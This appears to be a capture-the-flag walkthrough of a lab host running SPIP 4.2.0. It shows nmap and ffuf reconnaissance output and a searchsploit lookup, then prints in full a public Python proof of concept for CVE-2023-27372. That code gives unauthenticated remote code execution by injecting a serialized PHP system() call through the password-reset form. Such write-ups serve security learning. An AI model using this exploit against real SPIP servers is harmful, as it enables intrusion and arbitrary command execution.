# 10.201.20.3

nmap -Pn -sV -sC -oN nmap.txt --open 10.201.20.3

┌──(root㉿docker-desktop)-[/]
└─# nmap -Pn -sV -sC -oN nmap.txt --open 10.201.20.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 15:03 UTC
Nmap scan report for 10.201.20.3
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 7c:7e:2e:2c:f7:c0:c2:65:04:f4:3f:f4:f8:42:af:07 (RSA)
| 256 4b:6e:8e:ff:63:f4:bc:6b:8a:ec:65:97:0f:33:55:40 (ECDSA)
|\_ 256 a7:a3:b7:2f:64:4e:c9:38:10:44:69:58:e1:e8:85:aa (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-title: Publisher's Pulse: SPIP Insights & Tips
|\_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

ffuf -u http://10.201.20.3 -H "Host:FUZZ.10.201.20.3" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 50 -mc 200,302

┌──(root㉿docker-desktop)-[/]
└─# ffuf -u http://10.201.20.3 -H "Host:FUZZ.10.201.20.3" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.201.20.3
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
:: Header : Host: FUZZ.10.201.20.3
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 178

---

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| 256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|\_ 256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-server-header: Apache/2.4.41 (Ubuntu)
|\_http-title: Publisher's Pulse: SPIP Insights & Tips
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

![](https://velog.velcdn.com/images/agnusdei1207/post/c9aee363-a145-4492-a058-9d1eabd973c6/image.png)

ffuf -u "http://10.201.20.3/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc all -fs 0 -fc 404
┌──(root㉿docker-desktop)-[/]
└─# ffuf -u "http://10.201.20.3/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.201.20.3/FUZZ
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

images [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 334ms]
server-status [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 419ms]
spip [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 330ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

![](https://velog.velcdn.com/images/agnusdei1207/post/1857c055-20e8-41ff-a8fa-0947585311cb/image.png)

images, server-status, spip

![](https://velog.velcdn.com/images/agnusdei1207/post/4b46f70a-95d5-4c12-8b5a-47b174ffecf3/image.png)

![](https://velog.velcdn.com/images/agnusdei1207/post/af9a94e6-090f-4696-9601-444fa18824f8/image.png)
http://10.201.20.3/spip/spip.php?page=login&url=spip.php%3Fpage%3Dplan&lang=fr

![](https://velog.velcdn.com/images/agnusdei1207/post/c85edd3d-63d7-4a14-8bc1-cc659a4e2aea/image.png)

- 4.2.0 unauthenticated vulnerable

https://github.com/advisories/GHSA-7w4r-xxr6-xrcj
https://github.com/PaulSec/SPIPScan?source=post_page-----a256af21d7bd---------------------------------------

> apt install exploitdb
> searchsploiot -u
> searchsploit spip

# 10.201.20.3

┌──(root㉿docker-desktop)-[/]
└─# searchsploit spip

---

Exploit Title | Path

---

SPIP - 'connect' PHP Injection (Metasploit) | php/remote/27941.rb
SPIP 1.8.2 - 'Spip_RSS.php' Remote Command Execution | php/webapps/27172.txt
SPIP 1.8.2g - Remote Command Execution | php/webapps/1482.php
SPIP 1.8.3 - 'Spip_login.php' Remote File Inclusion | php/webapps/27589.txt
SPIP 1.8/1.9 - 'index.php3' Cross-Site Scripting | php/webapps/27158.txt
SPIP 1.8/1.9 - Multiple SQL Injections | php/webapps/27157.txt
SPIP 2.1 - 'var_login' Cross-Site Scripting | php/webapps/34388.txt
SPIP 2.x - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/37397.html
SPIP 3.1.1/3.1.2 - File Enumeration / Path Traversal | php/webapps/40596.txt
SPIP 3.1.2 - Cross-Site Request Forgery | php/webapps/40597.txt
SPIP 3.1.2 Template Compiler/Composer - PHP Code Execution | php/webapps/40595.txt
SPIP < 2.0.9 - Arbitrary Copy All Passwords to '.XML' File | php/webapps/9448.py
SPIP CMS < 2.0.23/ 2.1.22/3.0.9 - Privilege Escalation | php/webapps/33425.py
spip v4.1.10 - Spoofing Admin account | php/webapps/51557.txt
SPIP v4.2.0 - Remote Code Execution (Unauthenticated) | php/webapps/51536.py

---

Shellcodes: No Results
Papers: No Results

![](https://velog.velcdn.com/images/agnusdei1207/post/35cf51f8-0267-4bba-8e49-4c8986663cfa/image.png)

SPIP v4.2.0 - Remote Code Execution (Unauthenticated) | php/webapps/51536.py

> cat /usr/share/exploitdb/exploits/php/webapps/51536.py

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Exploit Title: SPIP v4.2.1 - Remote Code Execution (Unauthenticated)
# Google Dork: inurl:"/spip.php?page=login"
# Date: 19/06/2023
# Exploit Author: nuts7 (https://github.com/nuts7/CVE-2023-27372)
# Vendor Homepage: https://www.spip.net/
# Software Link: https://files.spip.net/spip/archives/
# Version: < 4.2.1 (Except few fixed versions indicated in the description)
# Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0
# CVE reference : CVE-2023-27372 (coiffeur)
# CVSS : 9.8 (Critical)
#
# Vulnerability Description:
#
# SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.
# This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.
#
# Usage: python3 CVE-2023-27372.py http://example.com

import argparse
import bs4
import html
import requests

def parseArgs():
    parser = argparse.ArgumentParser(description="Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by nuts7")
    parser.add_argument("-u", "--url", default=None, required=True, help="SPIP application base URL")
    parser.add_argument("-c", "--command", default=None, required=True, help="Command to execute")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
    return parser.parse_args()

def get_anticsrf(url):
    r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=10)
    soup = bs4.BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
    if csrf_input:
        csrf_value = csrf_input['value']
        if options.verbose:
            print("[+] Anti-CSRF token found : %s" % csrf_value)
        return csrf_value
    else:
        print("[-] Unable to find Anti-CSRF token")
        return -1

def send_payload(url, payload):
    data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf,
        "oubli": payload
    }
    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
    if options.verbose:
        print("[+] Execute this payload : %s" % payload)
    return 0

if __name__ == '__main__':
    options = parseArgs()

    requests.packages.urllib3.disable_warnings()
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    try:
        requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    except AttributeError:
        pass

    csrf = get_anticsrf(url=options.url)
    send_payload(url=options.url, payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len(options.command), options.command))
```

//
